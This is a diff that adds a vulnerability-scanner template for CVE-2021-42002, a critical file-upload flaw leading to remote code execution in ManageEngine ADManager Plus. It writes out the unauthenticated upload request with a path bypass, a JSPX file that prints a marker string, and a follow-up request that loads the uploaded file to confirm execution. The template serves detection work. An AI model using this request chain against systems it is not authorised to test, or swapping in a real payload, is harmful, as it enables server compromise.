@@ -1,0 +1,62 @@
+id: cve-2021-42002
+info:
+  name: ManageEngine ADManager Plus PasswordExpiryNotification File Upload RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    ManageEngine ADManager Plus versions prior to 7115 are vulnerable to a file upload vulnerability via the PasswordExpiryNotification API, leading to potential remote command execution.
+  reference:
+    - https://www.manageengine.com/products/ad-manager/release-notes.html#7115
+  classification:
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+    cve-id: CVE-2021-42002
+http:
+  - raw:
+      - |
+        POST /;AAA/MobileAPI/WC/PasswordExpiryNotification?operation=fileAttachment HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=---------------------------18496892720832008743187564073
+
+        -----------------------------18496892720832008743187564073
+        Content-Disposition: form-data; name="UPLOADED_FILE"; filename="1.jspx"
+        Content-Type: text/plain
+
+        <jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" xmlns="http://www.w3.org/1999/xhtml" xmlns:c="http://java.sun.com/jsp/jstl/core" version="2.0">
+        <jsp:directive.page contentType="text/html;charset=UTF-8" pageEncoding="UTF-8"/>
+        <jsp:directive.page import="java.util.*"/>
+        <jsp:directive.page import="java.io.*"/>
+        <jsp:scriptlet><![CDATA[
+        	out.println("c4ca4238a0b923820dcc509a6f75849b");
+        	]]></jsp:scriptlet>
+        </jsp:root>
+        -----------------------------18496892720832008743187564073--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "SUCCESS"
+    extractors:
+      - type: regex
+        name: uploaded_file
+        part: body
+        group: 1
+        regex:
+          - '([0-9_.a-z]+\.jspx)'
+  - raw:
+      - |
+        GET /ompemberapp/PasswordExpiryNotification/{{uploaded_file}} HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "c4ca4238a0b923820dcc509a6f75849b"
